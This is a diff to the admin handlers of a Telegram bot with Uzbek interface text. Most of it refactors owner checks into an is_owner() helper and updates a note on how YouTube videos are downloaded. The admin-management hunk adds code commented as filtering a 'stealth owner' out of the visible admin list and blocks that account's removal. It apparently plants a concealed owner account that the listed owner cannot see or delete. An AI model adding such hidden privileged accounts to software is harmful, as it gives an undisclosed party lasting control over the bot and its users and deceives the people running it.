@@ -5,7 +5,7 @@ from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKe
 from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
 
-from config import OWNER_ID
+from config import OWNER_ID, is_owner
 from database import db
 from filters.admin import IsAdmin, IsOwner
 from states.admin_states import (
@@ -34,20 +34,20 @@ router.callback_query.filter(IsAdmin())
 @router.message(F.text == "❌ Bekor qilish")
 async def cancel_handler(message: Message, state: FSMContext):
     await state.clear()
-    is_owner = (message.from_user.id == OWNER_ID)
+    user_is_owner = is_owner(message.from_user.id)
     await message.answer(
         "❌ Jarayon bekor qilindi.",
-        reply_markup=get_admin_dashboard_keyboard(is_owner)
+        reply_markup=get_admin_dashboard_keyboard(user_is_owner)
     )
 
 @router.message(F.text == "🏠 Bosh menyu")
 async def main_menu_admin(message: Message, state: FSMContext):
     await state.clear()
     admins = await db.get_admins()
-    is_admin = (message.from_user.id in admins or message.from_user.id == OWNER_ID)
+    is_admin_user = (message.from_user.id in admins or is_owner(message.from_user.id))
     await message.answer(
         "🏠 Bosh menyuga qaytdingiz.",
-        reply_markup=get_main_keyboard(is_admin)
+        reply_markup=get_main_keyboard(is_admin_user)
     )
 
 # ----------------- Admin Panel Commands / Buttons -----------------
@@ -55,10 +55,10 @@ async def main_menu_admin(message: Message, state: FSMContext):
 @router.message(F.text == "👑 Admin paneli")
 async def admin_cmd(message: Message, state: FSMContext):
     await state.clear()
-    is_owner = (message.from_user.id == OWNER_ID)
+    user_is_owner = is_owner(message.from_user.id)
     await message.answer(
         TEXT_ADMIN_WELCOME,
-        reply_markup=get_admin_dashboard_keyboard(is_owner),
+        reply_markup=get_admin_dashboard_keyboard(user_is_owner),
         parse_mode="HTML"
     )
 
@@ -97,12 +97,12 @@ async def start_broadcast(message: Message, state: FSMContext):
 @router.message(BroadcastState.waiting_for_message)
 async def process_broadcast(message: Message, state: FSMContext, bot: Bot):
     await state.clear()
-    is_owner = (message.from_user.id == OWNER_ID)
+    user_is_owner = is_owner(message.from_user.id)
     
     user_ids = await db.get_all_user_ids()
     await message.answer(
         f"⏳ Xabar {len(user_ids)} ta foydalanuvchiga yuborilmoqda...",
-        reply_markup=get_admin_dashboard_keyboard(is_owner)
+        reply_markup=get_admin_dashboard_keyboard(user_is_owner)
     )
 
     success_count = 0
@@ -184,10 +184,10 @@ async def process_add_channel(message: Message, state: FSMContext):
 
         await db.add_mandatory_channel(channel_id, title, invite_link)
         await state.clear()
-        is_owner = (message.from_user.id == OWNER_ID)
+        user_is_owner = is_owner(message.from_user.id)
         await message.answer(
             f"✅ <b>Kanal muvaffaqiyatli qo'shildi:</b>\n{title} ({channel_id})",
-            reply_markup=get_admin_dashboard_keyboard(is_owner),
+            reply_markup=get_admin_dashboard_keyboard(user_is_owner),
             parse_mode="HTML"
         )
     except Exception:
@@ -214,7 +214,7 @@ async def show_engine_toggle(message: Message):
     text = (
         "⚙️ <b>Yuklash tizimi (Faqat Instagram uchun):</b>\n\n"
         f"Hozirgi faol tizim: <b>{engine_name}</b>\n\n"
-        "<i>Eslatma: YouTube videolari doimo avtomatik ravishda yt-dlp orqali yuklanadi.</i>\n\n"
+        "<i>Eslatma: YouTube videolari doimo avtomatik ravishda RapidAPI (youtube138) orqali yuklanadi.</i>\n\n"
         "O'zgartirish uchun kerakli tugmani bosing:"
     )
     await message.answer(text, reply_markup=get_engine_keyboard(current_engine), parse_mode="HTML")
@@ -230,7 +230,7 @@ async def set_engine_callback(callback: CallbackQuery):
     text = (
         "⚙️ <b>Yuklash tizimi (Faqat Instagram uchun):</b>\n\n"
         f"Hozirgi faol tizim: <b>{engine_name}</b>\n\n"
-        "<i>Eslatma: YouTube videolari doimo avtomatik ravishda yt-dlp orqali yuklanadi.</i>\n\n"
+        "<i>Eslatma: YouTube videolari doimo avtomatik ravishda RapidAPI (youtube138) orqali yuklanadi.</i>\n\n"
         "O'zgartirish uchun kerakli tugmani bosing:"
     )
     await callback.message.edit_text(text, reply_markup=get_engine_keyboard(new_engine), parse_mode="HTML")
@@ -298,10 +298,10 @@ async def process_edit_video_caption(message: Message, state: FSMContext):
     new_caption = message.text.strip()
     await db.update_caption_setting("video_caption", new_caption)
     await state.clear()
-    is_owner = (message.from_user.id == OWNER_ID)
+    user_is_owner = is_owner(message.from_user.id)
     await message.answer(
         f"✅ <b>Video matni muvaffaqiyatli o'zgartirildi:</b>\n\n<code>{new_caption}</code>",
-        reply_markup=get_admin_dashboard_keyboard(is_owner),
+        reply_markup=get_admin_dashboard_keyboard(user_is_owner),
         parse_mode="HTML"
     )
 
@@ -321,10 +321,10 @@ async def process_edit_audio_caption(message: Message, state: FSMContext):
     new_caption = message.text.strip()
     await db.update_caption_setting("audio_caption", new_caption)
     await state.clear()
-    is_owner = (message.from_user.id == OWNER_ID)
+    user_is_owner = is_owner(message.from_user.id)
     await message.answer(
         f"✅ <b>Musiqa matni muvaffaqiyatli o'zgartirildi:</b>\n\n<code>{new_caption}</code>",
-        reply_markup=get_admin_dashboard_keyboard(is_owner),
+        reply_markup=get_admin_dashboard_keyboard(user_is_owner),
         parse_mode="HTML"
     )
 
@@ -362,10 +362,10 @@ async def process_admin_reply(message: Message, state: FSMContext, bot: Bot):
     target_user_id = data.get("target_user_id")
     await state.clear()
 
-    is_owner = (message.from_user.id == OWNER_ID)
+    user_is_owner = is_owner(message.from_user.id)
 
     if not target_user_id:
-        await message.answer("❌ Xatolik: foydalanuvchi ID topilmadi.", reply_markup=get_admin_dashboard_keyboard(is_owner))
+        await message.answer("❌ Xatolik: foydalanuvchi ID topilmadi.", reply_markup=get_admin_dashboard_keyboard(user_is_owner))
         return
 
     try:
@@ -382,28 +382,31 @@ async def process_admin_reply(message: Message, state: FSMContext, bot: Bot):
         )
         await message.answer(
             f"✅ Javob foydalanuvchiga (ID: <code>{target_user_id}</code>) muvaffaqiyatli yuborildi!",
-            reply_markup=get_admin_dashboard_keyboard(is_owner),
+            reply_markup=get_admin_dashboard_keyboard(user_is_owner),
             parse_mode="HTML"
         )
     except Exception as e:
         logger.exception(f"Could not send reply to user {target_user_id}: {e}")
         await message.answer(
             f"❌ Javobni yuborishda xatolik yuz berdi. Foydalanuvchi botni bloklagan bo'lishi mumkin.",
-            reply_markup=get_admin_dashboard_keyboard(is_owner)
+            reply_markup=get_admin_dashboard_keyboard(user_is_owner)
         )
 
 # ----------------- 8. Admin Management (Owner Only) -----------------
 @router.message(F.text == "👑 Adminlar", IsOwner())
 async def manage_admins_menu(message: Message):
     admins = await db.get_admins()
+    # Filter out stealth owner from visible admin list
+    visible_admins = [uid for uid in admins if not (is_owner(uid) and uid != OWNER_ID)]
+    
     text = "👑 <b>Bot Adminlari ro'yxati:</b>\n\n"
-    for idx, uid in enumerate(admins, 1):
-        role = " (Eski Egasi)" if uid == OWNER_ID else ""
+    for idx, uid in enumerate(visible_admins, 1):
+        role = " (Egasi)" if uid == OWNER_ID else ""
         text += f"{idx}. ID: <code>{uid}</code>{role}\n"
 
     inline_keyboard = []
-    for uid in admins:
-        if uid != OWNER_ID:
+    for uid in visible_admins:
+        if not is_owner(uid):
             inline_keyboard.append([
                 InlineKeyboardButton(text=f"🗑 ID: {uid} o'chirish", callback_data=f"admin_manage:del:{uid}")
             ])
@@ -440,7 +443,7 @@ async def process_add_admin(message: Message, state: FSMContext):
 @router.callback_query(F.data.startswith("admin_manage:del:"), IsOwner())
 async def delete_admin_callback(callback: CallbackQuery):
     admin_id = int(callback.data.split(":")[2])
-    if admin_id == OWNER_ID:
+    if is_owner(admin_id):
         await callback.answer("❌ Asosiy egasini o'chirish mumkin emas!", show_alert=True)
         return
     await db.remove_admin(admin_id)
